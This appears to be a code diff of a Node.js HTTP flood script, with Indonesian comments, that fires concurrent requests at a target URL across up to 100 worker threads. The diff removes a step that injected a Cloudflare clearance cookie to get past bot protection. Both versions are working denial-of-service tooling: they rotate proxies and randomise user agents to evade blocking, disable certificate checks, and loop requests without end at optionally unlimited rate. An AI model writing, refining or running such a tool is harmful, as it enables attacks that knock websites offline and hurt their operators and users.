@@ -1,24 +1,23 @@
-// high_rps.js - Request HTTPS dengan RPS besar
-// Usage: node high_rps.js <target_url> <concurrent_connections> <rps_limit>
-// Contoh: node high_rps.js https://target.com 200 500
+// high_rps_no_cf.js - Request tanpa cf_clearance
+// Usage: node high_rps_no_cf.js <target_url> <concurrent_connections> [rps_limit] [proxy_file]
 
 const fs = require('fs');
 const https = require('https');
 const http = require('http');
-const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
 const { URL } = require('url');
+const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
 
 // ========== KONFIGURASI ==========
 const args = process.argv.slice(2);
 if (args.length < 2) {
     console.log(`
-Usage: node high_rps.js <target_url> <concurrent_connections> [rps_limit] [proxy_file]
+Usage: node high_rps_no_cf.js <target_url> <concurrent_connections> [rps_limit] [proxy_file]
 
 Options:
-  target_url            Target URL (https://...)
-  concurrent_connections Jumlah koneksi paralel per worker (total = workers * ini)
-  rps_limit             Maks request per detik (0 = unlimited)
-  proxy_file            File proxy (default: proxy.txt)
+  target_url              Target URL (http://... atau https://...)
+  concurrent_connections  Jumlah koneksi paralel per worker
+  rps_limit               Maks request per detik (0 = unlimited)
+  proxy_file              File proxy (default: proxy.txt)
 `);
     process.exit(1);
 }
@@ -28,16 +27,26 @@ const CONCURRENT_PER_WORKER = parseInt(args[1], 10);
 const RPS_LIMIT = args[2] ? parseInt(args[2], 10) : 0;
 const PROXY_FILE = args[3] || 'proxy.txt';
 
-// Optimasi: keep-alive agent dengan banyak socket
+// Validasi URL
+let parsedTarget;
+try {
+    parsedTarget = new URL(TARGET_URL);
+} catch (e) {
+    console.error("[-] URL tidak valid:", e.message);
+    process.exit(1);
+}
+const isHttps = parsedTarget.protocol === 'https:';
+
+// Optimasi agent keep-alive
 const AGENT_OPTIONS = {
     keepAlive: true,
     keepAliveMsecs: 1000,
-    maxSockets: CONCURRENT_PER_WORKER * 2,   // setiap worker punya agent sendiri
+    maxSockets: CONCURRENT_PER_WORKER * 2,
     maxFreeSockets: 10,
     timeout: 60000,
 };
 
-// Header dasar (random user-agent setiap request di dalam worker)
+// Header dasar (random user-agent akan digenerate per request)
 const DEFAULT_HEADERS = {
     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
     'Accept-Language': 'en-US,en;q=0.9',
@@ -50,141 +59,86 @@ const DEFAULT_HEADERS = {
 // Baca proxy
 let PROXY_LIST = [];
 try {
-    PROXY_LIST = fs.readFileSync(PROXY_FILE, 'utf-8')
-        .split('\n')
+    const proxyContent = fs.readFileSync(PROXY_FILE, 'utf-8');
+    PROXY_LIST = proxyContent.split('\n')
         .map(l => l.trim())
         .filter(l => l && !l.startsWith('#'));
     if (PROXY_LIST.length === 0) throw new Error('Proxy list kosong');
-    console.log(`[+] Loaded ${PROXY_LIST.length} proxies`);
+    console.log(`[+] Loaded ${PROXY_LIST.length} proxies dari ${PROXY_FILE}`);
 } catch (err) {
     console.error(`[-] Gagal baca proxy: ${err.message}`);
-    process.exit(1);
-}
-
-// Fungsi untuk mendapatkan cf_clearance (manual atau bypass sekali)
-// Di sini Anda bisa memasukkan nilai cf_clearance dari browser manual
-// Untuk keperluan demo, kita asumsikan cf_clearance sudah didapat sebelumnya
-async function getCfClearance() {
-    // Ganti dengan nilai dari browser atau gunakan puppeteer sekali
-    // Contoh: return 'abcdef12345...'
-    console.log('[!] Pastikan Anda sudah memiliki cf_clearance cookie!');
-    console.log('[!] Masukkan cf_clearance: ');
-    // Untuk demo, baca dari environment variable atau file
-    const cf = process.env.CF_CLEARANCE || fs.readFileSync('cf_clearance.txt', 'utf-8').trim();
-    if (!cf) {
-        throw new Error('cf_clearance tidak ditemukan. Set env CF_CLEARANCE atau buat file cf_clearance.txt');
-    }
-    return cf;
+    console.log('[!] Melanjutkan tanpa proxy (direct connection)');
+    PROXY_LIST = [null]; // satu entry dummy
 }
 
 // ========== WORKER THREAD ==========
 if (isMainThread) {
-    // Main thread: jalankan worker pool
-    (async () => {
-        let cfClearance;
-        try {
-            cfClearance = await getCfClearance();
-            console.log(`[+] cf_clearance siap: ${cfClearance.substring(0,20)}...`);
-        } catch (err) {
-            console.error(`[-] ${err.message}`);
-            process.exit(1);
-        }
+    // Main thread: buat worker pool
+    const totalWorkers = Math.min(PROXY_LIST.length, 100); // maks 100 worker
+    console.log(`[+] Starting ${totalWorkers} workers, each with ${CONCURRENT_PER_WORKER} concurrent connections`);
 
-        // Jumlah worker = jumlah proxy (atau bisa ditentukan)
-        // Agar RPS besar, kita buat worker sebanyak jumlah proxy
-        const workers = [];
-        const totalWorkers = Math.min(PROXY_LIST.length, 100); // max 100 worker
-        console.log(`[+] Starting ${totalWorkers} workers, each with ${CONCURRENT_PER_WORKER} concurrent connections`);
-
-        let totalRps = 0;
-        let intervalId;
-
-        if (RPS_LIMIT > 0) {
-            // Rate limiting global: batasi total request per detik
-            let requestTokens = RPS_LIMIT;
-            intervalId = setInterval(() => {
-                requestTokens = RPS_LIMIT;
-            }, 1000);
-            // Fungsi untuk meminta token dari pool global
-            const getToken = () => {
-                return new Promise((resolve) => {
-                    if (requestTokens > 0) {
-                        requestTokens--;
-                        resolve(true);
-                    } else {
-                        setTimeout(() => getToken().then(resolve), 10);
-                    }
-                });
-            };
-            // Kirim fungsi token ke worker
-            // Namun worker tidak bisa langsung mengakses closure main thread.
-            // Alternatif: worker sendiri yang melakukan rate limiting internal.
-        }
-
-        for (let i = 0; i < totalWorkers; i++) {
-            const proxy = PROXY_LIST[i % PROXY_LIST.length];
-            const worker = new Worker(__filename, {
-                workerData: {
-                    targetUrl: TARGET_URL,
-                    proxy: proxy,
-                    cfClearance: cfClearance,
-                    concurrent: CONCURRENT_PER_WORKER,
-                    rpsLimit: RPS_LIMIT > 0 ? Math.floor(RPS_LIMIT / totalWorkers) : 0,
-                }
-            });
-            worker.on('message', (msg) => {
-                console.log(`[Worker ${i}] ${msg}`);
-            });
-            worker.on('error', (err) => {
-                console.error(`[Worker ${i}] error: ${err.message}`);
-            });
-            worker.on('exit', (code) => {
-                if (code !== 0) console.error(`[Worker ${i}] exit code ${code}`);
-            });
-            workers.push(worker);
-            // Jeda startup
-            await new Promise(r => setTimeout(r, 100));
-        }
-
-        console.log(`[+] ${workers.length} workers running. Press Ctrl+C to stop.`);
-        process.on('SIGINT', () => {
-            console.log('\n[!] Stopping workers...');
-            workers.forEach(w => w.terminate());
-            if (intervalId) clearInterval(intervalId);
-            process.exit(0);
+    const workers = [];
+    for (let i = 0; i < totalWorkers; i++) {
+        const proxy = PROXY_LIST[i % PROXY_LIST.length];
+        const worker = new Worker(__filename, {
+            workerData: {
+                targetUrl: TARGET_URL,
+                proxy: proxy,
+                concurrent: CONCURRENT_PER_WORKER,
+                rpsLimit: RPS_LIMIT > 0 ? Math.floor(RPS_LIMIT / totalWorkers) : 0,
+            }
         });
-    })();
+        worker.on('message', (msg) => {
+            console.log(`[Worker ${i}] ${msg}`);
+        });
+        worker.on('error', (err) => {
+            console.error(`[Worker ${i}] error: ${err.message}`);
+        });
+        worker.on('exit', (code) => {
+            if (code !== 0) console.error(`[Worker ${i}] exit code ${code}`);
+        });
+        workers.push(worker);
+        // Jeda startup
+        setTimeout(() => {}, 100);
+    }
+
+    console.log(`[+] ${workers.length} workers running. Press Ctrl+C to stop.`);
+    process.on('SIGINT', () => {
+        console.log('\n[!] Stopping workers...');
+        workers.forEach(w => w.terminate());
+        process.exit(0);
+    });
 } else {
-    // Worker thread: melakukan request dengan concurrent connections
-    const { targetUrl, proxy, cfClearance, concurrent, rpsLimit } = workerData;
+    // Worker thread
+    const { targetUrl, proxy, concurrent, rpsLimit } = workerData;
     const parsedTarget = new URL(targetUrl);
     const isHttps = parsedTarget.protocol === 'https:';
 
-    // Agent dengan keep-alive untuk reuse koneksi
+    // Agent dengan atau tanpa proxy
     let agent;
     if (proxy) {
-        // Proxy support: kita gunakan http.Agent dengan tunnel?
-        // Untuk sederhananya, kita gunakan axios dengan proxy agent, tapi untuk performa lebih baik pakai http(s).Agent manual
-        // Di sini kita gunakan `https-proxy-agent` untuk mengatasi proxy
-        const { HttpsProxyAgent } = require('https-proxy-agent');
-        agent = new HttpsProxyAgent(proxy, AGENT_OPTIONS);
+        try {
+            const { HttpsProxyAgent } = require('https-proxy-agent');
+            agent = new HttpsProxyAgent(proxy, AGENT_OPTIONS);
+        } catch (err) {
+            parentPort.postMessage(`Gagal load proxy agent: ${err.message}`);
+            process.exit(1);
+        }
     } else {
-        // Direct connection
         agent = isHttps ? new https.Agent(AGENT_OPTIONS) : new http.Agent(AGENT_OPTIONS);
     }
 
-    // Fungsi membuat random user-agent
+    // Random User-Agent
     function randomUA() {
         const chromeVer = Math.floor(Math.random() * 30) + 90;
         return `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${chromeVer}.0.0.0 Safari/537.36`;
     }
 
-    // Fungsi melakukan request
+    // Fungsi request
     async function doRequest() {
         const headers = {
             ...DEFAULT_HEADERS,
             'User-Agent': randomUA(),
-            'Cookie': `cf_clearance=${cfClearance}`,
             'Host': parsedTarget.host,
         };
         const options = {
@@ -195,13 +149,12 @@ if (isMainThread) {
             headers: headers,
             agent: agent,
             timeout: 10000,
-            rejectUnauthorized: false, // ignore SSL errors (untuk testing)
+            rejectUnauthorized: false, // abaikan error sertifikat
         };
         return new Promise((resolve) => {
             const protocol = isHttps ? https : http;
             const req = protocol.request(options, (res) => {
-                // Consume response data to free memory
-                res.resume();
+                res.resume(); // buang response body
                 resolve({ status: res.statusCode, success: res.statusCode < 400 });
             });
             req.on('error', (err) => {
@@ -236,12 +189,10 @@ if (isMainThread) {
         }
     }
 
-    // Loop concurrent dengan fixed pool size
+    // Loop concurrent dengan pool
     async function runWorker() {
         const promises = [];
-        // Jalankan concurrent task secara terus menerus
         while (true) {
-            // Jika jumlah promise kurang dari concurrent, tambahkan baru
             while (promises.length < concurrent) {
                 const p = throttledRequest().finally(() => {
                     const idx = promises.indexOf(p);
@@ -249,11 +200,9 @@ if (isMainThread) {
                 });
                 promises.push(p);
             }
-            // Tunggu salah satu selesai
             if (promises.length >= concurrent) {
                 await Promise.race(promises);
             }
-            // Jeda kecil agar tidak membanjiri event loop
             await new Promise(r => setTimeout(r, 1));
         }
     }
